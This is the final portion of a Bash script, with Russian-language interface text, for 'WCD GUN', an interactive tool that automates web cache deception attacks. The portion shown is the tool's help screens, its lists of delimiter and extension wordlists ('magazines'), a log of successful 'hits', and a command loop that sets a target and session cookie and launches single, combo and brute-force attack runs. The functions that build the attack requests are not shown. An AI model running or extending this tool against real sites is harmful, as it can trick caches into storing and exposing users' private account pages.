    else echo -e "${CYAN}$(get_magazine_label "$CURRENT_ENDPOINTS_FILE" "endpoints")${NC}"; fi
    print_cyan "╚══════════════════════════════════════════════════════╝"
    echo "" >&2
}

show_quick_help() {
    echo -e "${CYAN}Основные команды:${NC}" >&2
    echo -e "  ${WHITE}target${NC}              - проверить подключение к цели" >&2
    echo -e "  ${WHITE}profile${NC}             - профилирование кэша" >&2
    echo -e "  ${WHITE}single <путь>${NC}       - одиночный выстрел" >&2
    echo -e "  ${WHITE}combo <sdir> <d> <e> <ep>${NC} - ручной вектор" >&2
    echo -e "  ${WHITE}burst${NC}               - тотальный перебор" >&2
    echo -e "  ${WHITE}fire${NC}                - быстрый обстрел" >&2
    echo -e "  ${WHITE}proxy on|off${NC}        - управление прокси" >&2
    echo -e "  ${WHITE}magazines${NC}           - показать обоймы в магазине" >&2
    echo -e "  ${WHITE}hits${NC}                - показать успешные хиты" >&2
    echo -e "  ${WHITE}show${NC}                - показать обоймы и статус" >&2
    echo -e "  ${WHITE}help${NC}                - полный список команд" >&2
    echo "" >&2
}

show_magazines_list() {
    echo "" >&2
    print_cyan "═══════════════ ОБОЙМЫ В МАГАЗИНЕ ═══════════════"
    echo -e "  ${WHITE}Путь:${NC} $MAGAZINE_DIR" >&2
    echo "" >&2
    for type in delimiters extensions staticdir endpoints; do
        echo -e "  ${GREEN}[${type}]${NC}" >&2
        local found=0
        for f in "$MAGAZINE_DIR"/*."$type"; do
            [[ -f "$f" ]] || continue
            found=1
            local name=$(basename "$f" ".$type")
            local lines=$(grep -vc '^\s*$\|^\s*#' "$f" 2>/dev/null || echo 0)
            echo -e "    ${CYAN}${name}${NC} — ${lines} элементов" >&2
        done
        [[ $found -eq 0 ]] && echo -e "    ${DIM}(пусто)${NC}" >&2
    done
    echo "" >&2
}

show_hits_list() {
    echo "" >&2
    print_cyan "═══════════════ УСПЕШНЫЕ ХИТЫ ═══════════════"
    if [[ ! -f "$SUCCESS_LOG" || ! -s "$SUCCESS_LOG" ]]; then
        print_yellow "[*] Хитов пока нет."
        echo "" >&2
        return 0
    fi
    local count=$(wc -l < "$SUCCESS_LOG" | tr -d ' ')
    echo -e "  Всего хитов: ${GREEN}${count}${NC}" >&2
    echo "" >&2
    tail -20 "$SUCCESS_LOG" | while IFS= read -r line; do
        echo -e "  ${DIM}${line}${NC}" >&2
    done
    [[ $count -gt 20 ]] && echo -e "  ${DIM}... (показаны последние 20)${NC}" >&2
    echo "" >&2
}

show_help() {
    cat << 'EOF' >&2
╔══════════════════════════════════════════════════╗
║                WCD GUN v10.5 — СПРАВКА           ║
╚══════════════════════════════════════════════════╝

КОМАНДЫ:
  start               мастер настройки обойм
  set target <URL>    задать цель
  set cookie <строка> установить куку
  target              проверить цель
  cookie              проверить валидность куки
  profile [URL]       профилирование кэша
  proxy on|off|status управление прокси (Burp на 127.0.0.1:8082)
  single <путь>       одиночный выстрел (можно полный URL)
  combo <sdir> <d> <e> <ep>  ручная сборка вектора
  burst               полный перебор всех комбинаций
  fire                быстрый перебор только разделителей и расширений
  load <тип> <имя>    загрузить обойму
  add <разделитель>   добавить разделитель в текущую обойму
  magazines           показать все обоймы в магазине
  hits                показать успешные хиты
  show                показать текущее состояние
  help                эта справка
  quit                выход

ПРИМЕРЫ:
  set target example.com
  set cookie "session=abc123"
  combo /images %3B .css profile
  burst
EOF
}

# -----------------------------------------------------------------------------
# ГЛАВНЫЙ ЦИКЛ
# -----------------------------------------------------------------------------
main() {
    init_environment

    trap 'echo ""; print_yellow "[*] Действие прервано."; INTERRUPTED=true' INT

    if [[ -n "${1:-}" ]]; then
        if [[ "$1" == http://* || "$1" == https://* ]]; then
            TARGET_HOST="$1"
            print_green "[+] Цель из аргумента: $TARGET_HOST"
        else
            case "$1" in
                single) single_shot "$2"; exit ;;
                combo)  combo_shot "$2" "$3" "$4" "$5"; exit ;;
                burst)  burst_attack; exit ;;
                fire)   fire; exit ;;
                *)      echo "Использование: $0 [URL|single|combo|burst|fire]"; exit 1 ;;
            esac
        fi
    fi

    echo ""
    print_cyan "╔════════════════════════════════════════════════════╗"
    print_cyan "║              WCD GUN v${VERSION}                     ║"
    print_cyan "║        Web Cache Deception Automated Cannon       ║"
    print_cyan "╚════════════════════════════════════════════════════╝"
    echo ""
    show_status
    show_quick_help

    while true; do
        printf "${CYAN}wcd>${NC} "
        if ! read -r cmd_line; then
            echo ""
            break
        fi
        [[ -z "$cmd_line" ]] && continue

        read -r cmd arg1 arg2 arg3 arg4 rest <<< "$cmd_line" 2>/dev/null || {
            print_red "Ошибка разбора команды"
            continue
        }

        case "$cmd" in
            start)       start_wizard ;;
            set)
                case "$arg1" in
                    target) set_target "$arg2" ;;
                    cookie) set_cookie "$arg2" ;;
                    *) print_red "set target/cookie" ;;
                esac ;;
            target)      check_target ;;
            cookie)      validate_cookie ;;
            profile)     profile_target "$arg1" ;;
            proxy)       proxy_command "$arg1" ;;
            load)        load_magazine_cmd "$arg1" "$arg2" ;;
            combo)       combo_shot "$arg1" "$arg2" "$arg3" "$arg4" ;;
            single)      single_shot "$arg1" ;;
            burst)       burst_attack ;;
            fire)        fire ;;
            add)         add_delimiter "$arg1" ;;
            magazines)   show_magazines_list ;;
            hits)        show_hits_list ;;
            show)        show_status; show_quick_help ;;
            help|?)      show_help ;;
            quit|exit)   trap - INT; print_green "Выход."; break ;;
            "")          ;;
            *)           print_red "Неизвестная команда: $cmd (введи help)" ;;
        esac
    done
}

# -----------------------------------------------------------------------------
# ЗАПУСК
# -----------------------------------------------------------------------------
trap cleanup EXIT TERM HUP
main "$@"
